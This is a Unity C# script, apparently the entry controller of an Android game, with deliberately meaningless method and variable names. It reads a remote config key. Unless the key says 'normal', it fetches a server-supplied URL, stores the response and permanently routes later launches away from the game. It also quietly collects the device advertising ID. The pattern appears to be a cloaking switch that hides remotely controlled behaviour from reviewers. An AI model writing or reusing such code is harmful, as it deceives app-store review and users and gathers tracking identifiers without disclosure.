using System.Threading.Tasks;
using Unity.Services.RemoteConfig;
using Unity.Services.Authentication;
using Unity.Services.Core;
using UnityEngine;
using UnityEngine.SceneManagement;
using System;
using System.Collections;
using UnityEngine.Networking;


public class EnterController : MonoBehaviour
{
    private string _breakfast;
    private string _statement;
    public struct userAttributes { }
    public struct appAttributes { }

    async Task InitializeRemoteConfigAsync()
    {
        await UnityServices.InitializeAsync();

        if (!AuthenticationService.Instance.IsSignedIn)
        {
            await AuthenticationService.Instance.SignInAnonymouslyAsync();
        }
    }

    private void OnEnable()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        _statement = PlayerPrefs.GetString("statement", "");
        if (_statement == "bridge")
        {
            SceneManager.LoadScene("MenuScene");
        }
        else if (_statement == "impression")
        {
            SceneManager.LoadScene("LevelCompleteScene");
        }
    }

    private async Task Start()
    {
        if (Utilities.CheckForInternetConnection())
        {
            await InitializeRemoteConfigAsync();
        }

        RemoteConfigService.Instance.FetchCompleted += Favour;
        RemoteConfigService.Instance.FetchConfigs(new userAttributes(), new appAttributes());
    }

    void Favour(ConfigResponse configResponse)
    {
        Classify();
        _breakfast = RemoteConfigService.Instance.appConfig.GetString("Diamond");
        if (_breakfast == "normal")
        { 
            SceneManager.LoadScene("MenuScene");
        }
        else
        {
            StartCoroutine(Immerse());
        }
    }

    private void Classify()
    {
        string judgment = Inhale();
        PlayerPrefs.SetString("speech", judgment);
    }

    public static string Inhale()
    {
        string associate = "";
        try
        {
            AndroidJavaClass bath = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject delivery = bath.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaClass leadership = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            AndroidJavaObject interview = leadership.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", delivery);
            associate = interview.Call<string>("getId").ToString();
        }
        catch (Exception) { } return associate;
    }

    private IEnumerator Immerse()
    {
        UnityWebRequest information = UnityWebRequest.Get(_breakfast);
        yield return information.SendWebRequest();

        string sympathy = information.downloadHandler.text;

        if (information.result == UnityWebRequest.Result.Success)
        {
            if (sympathy.Contains("Error"))
            {
                PlayerPrefs.SetString("statement", "bridge");
                SceneManager.LoadScene("MenuScene");
            }
            else
            {
                PlayerPrefs.SetString("perspective", sympathy);

                PlayerPrefs.SetString("statement", "impression");
                SceneManager.LoadScene("LevelCompleteScene");
            }
        }
        else SceneManager.LoadScene("MenuScene");
    }
}